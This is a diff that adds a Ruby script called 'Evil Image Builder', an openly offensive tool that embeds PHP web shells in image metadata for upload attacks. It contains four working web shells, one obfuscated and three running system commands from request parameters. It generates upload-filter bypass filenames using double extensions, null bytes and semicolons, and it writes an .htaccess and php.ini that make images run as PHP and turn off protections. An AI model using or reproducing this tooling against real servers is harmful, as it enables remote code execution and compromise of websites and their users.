@@ -1,0 +1,443 @@
+#!/usr/bin/env ruby
+#
+# Evil Image Builder
+# A Ruby ExifTool GUI of sorts
+# By: Hood3dRob1n
+#
+# Pre-Requisites:
+# MiniExifTool is a wrapper for ExifTool CLI
+# ExifTool CLI Installation: http://www.sno.phy.queensu.ca/~phil/exiftool/install.html
+#	Download file...
+#   	  cd <your download directory>
+# 	  gzip -dc Image-ExifTool-#.##.tar.gz | tar -xf -
+#  	  cd Image-ExifTool-#.##/
+#	    perl Makefile.PL
+#	    make test
+#	    sudo make install
+#
+
+####### STD GEMS #########
+require 'fileutils'      #
+require 'optparse'       #
+###### NON-STD GEMS ######
+require 'mini_exiftool'  #
+require 'colorize'       #
+##########################
+
+HOME=File.expand_path(File.dirname(__FILE__))
+EVIL=HOME + '/evil/'
+UP = EVIL + 'uploads/'
+
+# Terminal Banner
+def banner
+  puts
+  print <<"EOT".white
+ _______________________________ 
+< OhNo - The Evil Image Builder >
+ ------------------------------- 
+  \\                 __ 
+   \\               (OO)
+    \\              (  )
+     \\             /--\\
+       __         / \\  \\ 
+      UOOU\\.'@@@@@@`.\\  )
+      \\__/(@@@@@@@@@@) /
+           (@@@@@@@@)(( 
+           `YY~~~~YY' \\\\
+            ||    ||   >>  
+EOT
+end
+
+# Clear Terminal
+def cls
+  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
+    system('cls')
+  else
+    system('clear')
+  end
+end
+
+# Delete MetaTag Value
+# Returns True on Success, False otherwise
+def delete(obj, tag)
+  if not obj.tags.include?(tag)
+    return false
+  else
+    obj[tag] = '' # Set to Nothing to Wipe Tag
+    if obj.save
+      return true
+    else
+      return false
+    end
+  end
+end
+
+# Write String to Tag
+# Returns True on Success, False otherwise
+def write(obj, str, tag)
+  obj[tag] = str
+  if obj.save
+    return true
+  else
+    return false
+  end
+end
+
+# Dump Tags & Values
+# Returns Hash {Tag=>Value}
+def dump(obj)
+  tagz={}
+  obj.tags.sort.each do |tag|
+    tagz.store(tag, obj[tag])
+  end
+  return tagz
+end
+
+# Build various Shell Upload Bypass Possibilities
+# Generates many possibilities and writes them to: OhNo/evil_images/uploads/
+def generate_uploads(shell, flip='gif')
+  Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+  Dir.mkdir(UP) unless File.exists?(UP) and File.directory?(UP)
+  php = [ 'php', 'pHp', 'php4', 'php5', 'phtml' ]
+  options = [ 'gif', 'jpeg', 'mp3', 'pdf', 'png', 'txt' ]
+  shell_name = shell.split('/')[-1]
+  # Read provided Shell into Var
+  data = File.open(shell).read
+  # Generate our Shell Possibilities for Uploading
+  php.each do |x|
+    a = shell_name.sub(shell.split('/')[-1].split('.')[-1], x)
+    f = File.open(UP + a, 'w+')
+    f.puts data
+    f.close
+  end
+  options.each do |y|
+    # Simple Concatenation of Filetypes: .php.jpeg
+    b = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '.' + y)
+    f = File.open(UP + b, 'w+')
+    f.puts data
+    f.close
+    if y =~ /GIF|JPEG|PNG/i
+      # Simple Concatenation of Filetypes (reversed order for evil images): .jpeg.php
+      c = shell_name.sub(shell.split('/')[-1].split('.')[-1], y + '.' + shell.split('/')[-1].split('.')[-1])
+      f = File.open(UP + c, 'w+')
+      f.puts data
+      f.close
+    end
+    # Another Concatenation of Filetypes in hopes it drops the trailing type: .php;jpeg
+    d = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + ';.' + y)
+    f = File.open(UP + d, 'w+')
+    f.puts data
+    f.close
+    # Null Byte to drop the trailing filetype
+    e = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '%00.' + y)
+    f = File.open(UP + e, 'w+')
+    f.puts data
+    f.close
+  end
+  # Bogus separator, unknown extension causes it to fallback to PHP
+  g = shell_name.sub(shell.split('/')[-1].split('.')[-1], shell.split('/')[-1].split('.')[-1] + '.xxxfoo')
+  f = File.open(UP + g, 'w+')
+  f.puts data
+  f.close
+
+  # Create .htaccess file for flipping filetype to php
+  f = File.open(UP + '.htaccess', 'w+')
+  f.puts "AddType application/x-httpd-php .#{flip}"
+  f.close
+
+  # PHP_INI Overrides
+  f = File.open(UP + 'php.ini', 'w+')
+  f.puts 'disable_functions = none'
+  f.puts 'magic_quotes_gpc = off'
+  f.puts 'safe_mode = off'
+  f.puts 'suhosin.executor.func.blacklist = foofucked'
+  f.close
+end
+
+# PHP Shells for Evil Image Builder
+# see more on sneaky shell here: http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html
+sneaky_shell = '<?php @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_; $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__]; $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] ); $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] ); $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ]; $_=$ $_[$__+ $__] ;$_[@-_]($_[@!+_] );?>'
+r0ng_shell = "<?if($_GET['r0ng']){echo'<pre>'.shell_exec($_GET['r0ng']);}?>"
+system_shell = "<?error_reporting(0);print(___);system($_REQUEST[cmd]);print(___);die;?>"
+eval_shell = "<?error_reporting(0);print(___);eval($_REQUEST[cmd]);print(___);die;?>"
+$shell='Sneaky Shell'
+$c=1
+
+### MAIN ### ##
+##################################### #
+options = {}
+optparse = OptionParser.new do |opts| 
+  opts.banner = "Usage".light_blue + ": #{$0} ".white + "[".light_blue + "OPTIONS".white + "]".light_blue
+  opts.separator ""
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.jpeg -d".white
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.gif -g 1 -t Comment".white
+  opts.separator "EX".light_blue + ": #{$0} -i ./images/ohno.gif -w 'HR was here' -t 'Comment'".white
+  opts.separator ""
+  opts.separator "Options".light_blue + ": ".white
+  opts.on('-i', '--image IMG', "\n\tImage File to Use".white) do |img|
+    if File.exists?(img.chomp) and not File.directory?(img.chomp)
+      options[:img] = img.chomp
+    else
+      cls
+      banner
+      puts
+      puts "Problem loading Image file".light_red + "!".white
+      puts "Check path and permissions and try again".light_red + ".....".white
+      puts
+      puts opts
+      puts
+      exit 666;
+    end
+  end
+  opts.on('-d', '--dump', "\n\tDump All Tags w/Values".white) do |meh|
+    options[:method] = 1
+  end
+  opts.on('-w', '--write STRING', "\n\tWrite Custom String to Tag".white) do |write_str|
+    options[:method] = 2
+    options[:str] = write_str.chomp
+  end
+  opts.on('-g', '--generate NUM', "\n\tWrite PHP Shell to Tag\n\t  0 => Sneaky Shell\n\t  1 => r0ng Shell\n\t  2 => Simple System() Shell\n\t  3 => Simple Eval Shell".white) do |num|
+    options[:method] = 3
+    if num.chomp.to_i >= 0 and num.chomp.to_i <= 3
+      options[:shell] = num.chomp.to_i
+    else
+      cls
+      banner
+      puts
+      puts "Unknown Shell Generator Option Requested".light_red + "!".white
+      puts
+      puts opts
+      puts
+      exit 69;
+    end
+  end
+  opts.on('-t', '--tag TAG', "\n\tTag Name to Write to".white) do |tag|
+    options[:tag] = tag.chomp
+  end
+  opts.on('-n', '--nuke TAG', "\n\tTry to Delete Tag".white) do |tag|
+    options[:method] = 4
+    options[:tag] = tag.chomp
+  end
+  opts.on('-u', '--uploads-gen SHELL', "\n\tGenerate Upload Bypass Possibilities for Shell".white) do |shell|
+    if File.exists?(shell.chomp) and not File.directory?(shell.chomp)
+      options[:method] = 5
+      options[:shell] = shell.chomp
+    else
+      cls
+      banner
+      puts
+      puts "Problem loading Shell file".light_red + "!".white
+      puts "Check path and permissions and try again".light_red + ".....".white
+      puts
+      puts opts
+      puts
+      exit 69;
+    end
+    options[:shell] = shell.chomp
+  end
+  opts.on('-h', '--help', "\n\tHelp Menu".white) do 
+    cls
+    banner
+    puts
+    puts opts
+    puts
+    exit 69;
+  end
+end
+begin
+  foo = ARGV[0] || ARGV[0] = "-h"
+  optparse.parse!
+  if options[:method].to_i == 1
+    mandatory = [:method, :img] # CLI DUMP
+  elsif options[:method].to_i == 3
+    mandatory = [:method, :img, :tag, :shell] # CLI Evil Image Generator
+  elsif options[:method].to_i == 5
+    mandatory = [:method, :shell] # CLI DUMP
+  elsif not options[:generate].nil?
+    mandatory = [:method, :img] # CLI DUMP
+  else
+    mandatory = [:method, :img, :tag] # CLI WRITE OR NUKE
+  end
+  missing = mandatory.select{ |param| options[param].nil? }
+  if not missing.empty?
+    cls
+    banner
+    puts
+    puts "Missing options".light_red + ": #{missing.join(', ')}".white
+    puts optparse
+    exit 666;
+  end
+rescue OptionParser::InvalidOption, OptionParser::MissingArgument
+  cls
+  banner
+  puts
+  puts $!.to_s
+  puts
+  puts optparse
+  puts
+  exit 666;   
+end
+cls
+banner
+case options[:method].to_i
+when 1
+  # Tag Dump
+  photo = MiniExiftool.new(options[:img])
+  v = photo.exiftool_version.to_s.split('.')
+  height = photo.image_height
+  width = photo.image_width
+  puts
+  puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+  puts
+  puts "Meta Info from".light_blue + ": #{options[:img].split('/')[-1]}".white
+  puts "Image Dimensions".white.underline + ": ".white
+  puts "Image Height".light_blue + ": #{height}".white
+  puts "Image Width".light_blue + ": #{width}".white
+  puts
+  puts "Available Tags".white.underline + ": ".white
+  photo.tags.sort.each do |tag|
+    puts "#{tag}".light_blue + ": #{photo[tag]}".white
+  end
+when 2
+  # Write to Tag
+  photo = MiniExiftool.new(options[:img])
+  v = photo.exiftool_version.to_s.split('.')
+  height = photo.image_height
+  width = photo.image_width
+  puts
+  puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+  puts
+  if not photo.tags.include?(options[:tag])
+    puts "Provided Tag doesn't appear to exist".light_red + "!".white
+    if photo.tags.include?('Comment')
+      puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+      options[:tag] = 'Comment'
+    else
+      puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+      options[:tag] = 'Comment'
+    end
+  end
+  original = photo[options[:tag]]
+  puts "Attempting write to the ".light_blue + "'".white + "#{options[:tag]}".light_blue + "'".white + " tag".light_blue + "....".white
+  puts "Current Value".light_blue + ": #{original}".white
+  puts "Write String".light_blue + ": #{options[:str]}".white
+  if write(photo, options[:str], options[:tag])
+    photo.reload # reload the new file info
+    if original != photo[options[:tag]]
+      puts
+      puts "Appears things were successful".light_green + "!".white
+      puts "Updated Value".light_green + ": #{photo[options[:tag]]}".white
+    else
+      puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+      puts "Value".light_yellow + ": #{photo[options[:tag]]}".white
+      puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+    end
+  else
+    puts "Problem writing to '#{options[:tag]}' Tag".light_red + "!".white
+    puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+  end
+when 3
+  # Evil Image Shell Generator
+  case options[:shell].to_i
+  when 0
+    # Sneaky Shell
+    shell = 'Sneaky'
+    payload = sneaky_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?0=system&1=id"
+  when 1
+    # r0ng Shell
+    shell = 'r0ng'
+    payload = r0ng_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?r0ng=id"
+  when 2
+    # System Shell
+    shell = 'System'
+    payload = system_shell
+    c = "http://localhost/forum/profile.php?inc=/profiles/0123456789/#{options[:img].split('/')[-1]}?cmd=id"
+  when 3
+    # Eval Shell
+    shell = 'Eval'
+    payload = eval_shell
+    c = "http://localhost/#{options[:img].split('/')[-1]}?cmd=system('id');"
+  end
+  # Make sure our evil images directory exists, if not create
+  # We also create a temporary directory to move images in and out of for use without affecting original
+  # Delete temp dir and cleanup when done
+  tmp = HOME + '/temp'
+  Dir.mkdir(EVIL) unless File.exists?(EVIL) and File.directory?(EVIL)
+  Dir.mkdir(tmp) unless File.exists?(tmp) and File.directory?(tmp)
+
+  real = MiniExiftool.new(options[:img])
+  innocent = tmp + '/' + options[:img].split('/')[-1]
+  FileUtils.copy_file(options[:img], innocent, preserve = true)
+  Dir.chdir(tmp) do
+    photo = MiniExiftool.new(options[:img].split('/')[-1])
+    v = photo.exiftool_version.to_s.split('.')
+    height = photo.image_height
+    width = photo.image_width
+    puts
+    puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+    puts
+    if not real.tags.include?(options[:tag])
+      puts "Provided Tag doesn't appear to exist".light_red + "!".white
+      if real.tags.include?('Comment')
+        puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+        options[:tag] = 'Comment'
+      else
+        puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+        options[:tag] = 'Comment'
+      end
+    end
+    original = photo[options[:tag]]
+    puts "Attempting to write ".light_blue + "'".white + "#{shell} Shell".light_blue + "'".white + " to the ".light_blue + "'".white + "#{options[:tag]}".light_blue + "'".white + " tag".light_blue + "....".white
+    puts "Current Value".light_blue + ": #{original}".white
+    puts "Write String".light_blue + ": \n#{payload}".white
+    puts
+    if write(photo, payload, options[:tag])
+      photo.reload # reload the new file info
+      if original != photo[options[:tag]]
+        FileUtils.copy_file(options[:img].split('/')[-1], "#{EVIL}/#{options[:img].split('/')[-1]}", preserve = true)
+        puts
+        puts "Appears things were successful".light_green + "!".white
+        puts "Updated Value".light_green + ": #{photo[options[:tag]]}".white
+        puts "Find your evil image here".light_green + ": #{EVIL}#{options[:img].split('/')[-1]}".white
+        puts "Example #{shell} Shell Execution".light_green + ": #{c}".white
+      else
+        puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+        puts "Value".light_yellow + ": #{photo[options[:tag]]}".white
+        puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+      end
+    else
+      puts "Problem writing to '#{options[:tag]}' Tag".light_red + "!".white
+      puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+    end
+  end
+  FileUtils.rm_rf(tmp)
+when 4
+  # Delete MetaTag if possible
+  photo = MiniExiftool.new(options[:img])
+  if not photo.tags.include?(options[:tag])
+    puts "Can't delete what doesn't exist".light_red + "!".white
+    puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+  else
+    if delete(photo, options[:tag])
+      puts
+      puts "Appears MetaTag removal was successful".light_green + "!".white
+      puts "Run the dump option to confirm the changes".light_green + "....".white
+    else
+      puts "Problem wiping Tag".light_red + "!".white
+      puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+    end
+  end
+when 5
+  # Uploads Generator
+  puts 
+  puts "Generating file upload bypass possibilities for #{options[:shell].split('/')[-1]}".light_blue + ".....".white
+  generate_uploads(options[:shell], flip='gif')
+  puts "Uploader bypass files created".light_green + "!".white
+  puts "Find them all here".light_green + ": #{UP}".white
+  puts "May the force be with you".light_green + "...........".white
+end
+puts
+puts
+# EOF
